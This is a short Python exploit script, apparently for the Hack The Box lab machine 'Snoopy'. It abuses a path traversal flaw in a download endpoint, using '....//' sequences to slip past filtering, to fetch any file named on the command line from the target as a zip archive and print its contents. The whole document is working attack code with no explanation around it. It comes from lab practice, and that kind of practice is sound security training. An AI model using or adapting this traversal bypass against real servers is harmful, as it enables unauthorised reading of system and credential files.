#!/usr/bin/env python3

import requests
import zipfile
import sys
import os

def make_req(url):
    req = requests.get(url, stream=True)
    with open("/home/tropkal/htb/snoopy/lfi.zip", "wb") as f:
        for chunk in req.iter_content(chunk_size=512):
            if chunk:
                f.write(chunk)
    if os.path.getsize("/home/tropkal/htb/snoopy/lfi.zip") == 0:
        print("[!] File doesnt exist or cant access it, the zip's size is 0 so we just delete it\n")
        os.system("rm /home/tropkal/htb/snoopy/lfi.zip")
        exit()

def read_zip():
    z = zipfile.ZipFile("/home/tropkal/htb/snoopy/lfi.zip")
    for filename in z.namelist():
        for line in z.open(filename):
            print(line.decode().replace("\n", ""))
        z.close()
    os.system("rm /home/tropkal/htb/snoopy/lfi.zip")

make_req(f"http://snoopy.htb/download?file=....//....//....//....//..../{sys.argv[1]}")
read_zip()
